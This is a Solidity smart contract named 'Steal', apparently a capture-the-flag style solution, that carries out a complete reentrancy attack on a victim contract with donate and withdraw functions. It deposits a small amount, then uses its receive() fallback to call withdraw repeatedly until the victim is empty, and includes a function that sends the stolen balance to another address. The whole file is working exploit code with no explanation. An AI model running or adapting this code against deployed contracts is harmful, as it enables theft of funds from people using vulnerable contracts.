// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Re {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Steal {
    Re victim;
    uint amount;

  constructor(address _addr) public payable {
    victim = Re(_addr);
    amount = .001 ether;
  }

  // Function to send eth in contract back somewhere else
  // (for testing if exploit doesnt work)
	function savior(address payable _to) public payable {
    (bool sent, ) = _to.call{value: address(this).balance}("");
		require(sent, "Failed to send ether");
	}

  // Put some eth into the victim so we can withdraw
	function sendBread() public payable {
    victim.donate.value(amount)(address(this));
	}

  // Initialize the chaos
  function withdrawBread() public {
    victim.withdraw(amount);
  }

  // Fallback function, repeatedly call victim.withdraw
	receive() external payable  {
		if (address(victim).balance >= amount) {
			victim.withdraw(amount);
		}
	}
}
